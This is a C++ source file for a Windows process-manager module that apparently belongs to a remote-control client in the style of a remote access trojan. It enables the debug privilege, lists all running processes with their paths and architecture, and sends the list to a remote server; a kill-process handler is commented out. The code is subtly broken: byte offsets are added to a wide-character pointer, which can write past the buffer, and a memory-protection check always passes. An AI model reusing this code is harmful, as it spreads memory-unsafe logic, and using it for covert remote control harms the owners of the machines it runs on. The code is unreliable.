#include "stdafx.h"

#include <tchar.h>
#include <Psapi.h>
#include <TlHelp32.h>
#pragma comment(lib,"Psapi.lib")

#include "ProcessManager.h"




CProcessManager::CProcessManager(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("ProcessManager is under Execution\r\n"));
	HMODULE hKernel32 = NULL;
	hKernel32 = GetModuleHandle(_T("kernel32"));
	if (hKernel32 == NULL)
	{
		return;
	}

	_M_IsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		hKernel32, "IsWow64Process");
	if(_M_IsWow64Process == NULL)
	{
		return;
	}

	EnableSeDebugPrivilege(_T("SeDebugPrivilege"), TRUE);

	SendClientProcessList();
}

CProcessManager::~CProcessManager()
{
	_tprintf(_T("ProcessManager Exit\r\n"));
	EnableSeDebugPrivilege(_T("SeDebugPrivilege"), FALSE);
}


void CProcessManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{

	switch (BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REQUIRE:
	{
		SendClientProcessList();
		break;
	}
	case CLIENT_PROCESS_REFRESH_REQUIRE:
	{
		SendClientProcessList();
		break;
	}
	case CLIENT_PROCESS_KILL_REPLY:
	{
		//_M_Ring3KillProcess((PULONG)((LPBYTE)BufferData+1),(BufferLength-1)/sizeof(ULONG));

		//_M_ClientOB->OnServerSending((char*)&IsToken, sizeof(BYTE));

		break;
	}
	default:
		break;
	}
	return;
}

BOOL CProcessManager::SendClientProcessList()
{
	BOOL IsOk = FALSE;
	DWORD offset = 1;
	DWORD v7 = 0;
	ULONG ItemCount = 0;
	TCHAR* BufferData = NULL;
	std::vector<PROCESS_INFO> ProcInfoVector;
	std::vector<PROCESS_INFO>::iterator i;
	
	ItemCount = EnumProcessList(ProcInfoVector);
	if (ItemCount == 0)
	{
		return IsOk;
	}
	BufferData = (TCHAR*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;
	for (i = ProcInfoVector.begin();i!= ProcInfoVector.end();i++)
	{
		v7 = sizeof(DWORD) +
			(_tcslen(i->ProcessImageName) + _tcslen(i->ProcessFullPath) +_tcslen(i->IsWow64) + 3) * sizeof(TCHAR);
		if (LocalSize(BufferData) < (offset + v7))
		{
			BufferData = (TCHAR*)LocalReAlloc(BufferData, (offset + v7),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData+offset,&(i->ProcessID),sizeof(ULONG32));
		offset += sizeof(ULONG32);
		memcpy(BufferData + offset, i->ProcessImageName, (_tcslen(i->ProcessImageName) + 1) * sizeof(TCHAR));
		offset += (_tcslen(i->ProcessImageName) + 1) * sizeof(TCHAR);
		memcpy(BufferData + offset, i->ProcessFullPath, (_tcslen(i->ProcessFullPath) + 1) * sizeof(TCHAR));
		offset += (_tcslen(i->ProcessFullPath) + 1) * sizeof(TCHAR);
		memcpy(BufferData + offset, i->IsWow64, (_tcslen(i->IsWow64) + 1) * sizeof(TCHAR));
		offset += (_tcslen(i->IsWow64) + 1) * sizeof(TCHAR);
	}
	_M_IOCPClient->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}

int  CProcessManager::EnumProcessList(std::vector<PROCESS_INFO>& ProcInfoVector)
{
	HANDLE hSnapshot = NULL;
	HANDLE hProcess  = NULL;
	TCHAR  IsWow64[20];
	PROCESSENTRY32 pe32;
	PROCESS_INFO   ProcessInfo;
	
	BOOL v1 = TRUE;
	HMODULE hModule = NULL;
	DWORD rLen = 0;

	TCHAR ProcessFullPath[MAX_PATH];
	ZeroMemory(IsWow64,         sizeof(IsWow64)        );
	ZeroMemory(&ProcessInfo,    sizeof(ProcessInfo)    );
	ZeroMemory(ProcessFullPath, sizeof(ProcessFullPath));

	pe32.dwSize = sizeof(PROCESSENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			hProcess = OpenProcess(
				PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				FALSE,
				pe32.th32ProcessID);
			if (hProcess == NULL)
			{
				hProcess = OpenProcess(
					PROCESS_QUERY_LIMITED_INFORMATION,
					FALSE,
					pe32.th32ProcessID
				);
				if (hProcess == NULL)
				{
					_tcscpy(ProcessFullPath, _T("OpenProcess() Fail"));
					_tcscpy(IsWow64, _T("Unknown"));
					goto Label;
				}
			}
			v1 = FALSE;
			if (IsWow64Process_(hProcess, &v1) == TRUE)
			{
				if (v1)
				{
					_tcscpy(IsWow64, _T("X86"));
				}
				else
				{
					_tcscpy(IsWow64, _T("X64"));
				}
			}
			else
			{
				_tcscpy(IsWow64, _T("Unknown"));
			}
			hModule = NULL;
			rLen = GetModuleFileNameEx(hProcess, hModule, ProcessFullPath, sizeof(ProcessFullPath));

			if (rLen == 0)
			{
				ZeroMemory(ProcessFullPath, MAX_PATH);
				QueryFullProcessImageName(hProcess, 0, ProcessFullPath, &rLen);
				if (rLen == 0)
				{
					_tcscpy(ProcessFullPath, _T("EnumInfor Fail"));
				}

			}
		Label:
			ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
			ProcessInfo.ProcessID = pe32.th32ProcessID;
			memcpy(ProcessInfo.ProcessImageName, pe32.szExeFile, (_tcslen(pe32.szExeFile)  + 1) * sizeof(TCHAR));
			memcpy(ProcessInfo.ProcessFullPath, ProcessFullPath, (_tcslen(ProcessFullPath) + 1) * sizeof(TCHAR));
			memcpy(ProcessInfo.IsWow64, IsWow64, (_tcslen(IsWow64) + 1) * sizeof(TCHAR));
			
			ProcInfoVector.push_back(ProcessInfo);
			if (hProcess != NULL)
			{
				CloseHandle(hProcess);
				hProcess = NULL;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	else
	{
		CloseHandle(hSnapshot);
		hSnapshot = NULL;
		return FALSE;
	}
	CloseHandle(hSnapshot);
	hSnapshot = NULL;

	return ProcInfoVector.size();
}

BOOL CProcessManager::IsWow64Process_(HANDLE hProcess, BOOL *IsResult)
{
	if (!IsValidWritePoint_(IsResult))
	{
		return FALSE;
	}
	if (!_M_IsWow64Process(hProcess, IsResult))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL CProcessManager::IsValidWritePoint_(LPVOID VirtualAddress)
{
	BOOL IsOk = FALSE;
	MEMORY_BASIC_INFORMATION MemoryBasicInfo = { 0 };
	VirtualQuery(VirtualAddress, &MemoryBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));

	if ((MemoryBasicInfo.State == MEM_COMMIT) &&
		PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
	{
		IsOk = TRUE;
	}
	return IsOk;

}